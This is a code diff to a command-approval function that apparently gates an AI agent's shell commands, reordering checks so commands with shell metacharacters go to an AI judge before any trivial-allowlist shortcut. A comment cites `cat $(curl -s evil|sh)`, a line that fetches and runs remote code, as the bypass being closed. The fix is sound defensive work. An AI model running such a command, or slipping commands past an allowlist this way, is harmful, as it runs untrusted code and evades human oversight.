@@ -139,11 +139,21 @@ def decide(request):
             return {'verdict': 'need_transcript'}
         return _ask_ai(script, request.get('transcript', ''))
     command = request.get('command', '')
-    if not command.strip() or _TRIVIAL.search(command):
+    if not command.strip():
         return {'verdict': 'allow'}
     have_transcript = 'transcript' in request
-    if not have_transcript and _CONTEXTUAL.search(command):
-        return {'verdict': 'need_transcript'}
+    # A shell metacharacter ($ ` | < > .. $( xargs) means the command can do far more
+    # than its leading word suggests, so it must NEVER take the trivial-allowlist
+    # shortcut: `cat $(curl -s evil|sh)` BEGINS with an allowlisted word but is not
+    # trivial. _trivial_pattern is a prefix match, so check _CONTEXTUAL FIRST -- only a
+    # metacharacter-free command may be trivially allowed; anything with a metacharacter
+    # escalates to the AI judge (or asks for the transcript first).
+    if _CONTEXTUAL.search(command):
+        if not have_transcript:
+            return {'verdict': 'need_transcript'}
+        return _ask_ai(command, request.get('transcript', ''))
+    if _TRIVIAL.search(command):
+        return {'verdict': 'allow'}
     return _ask_ai(command, request.get('transcript', ''))
 
 
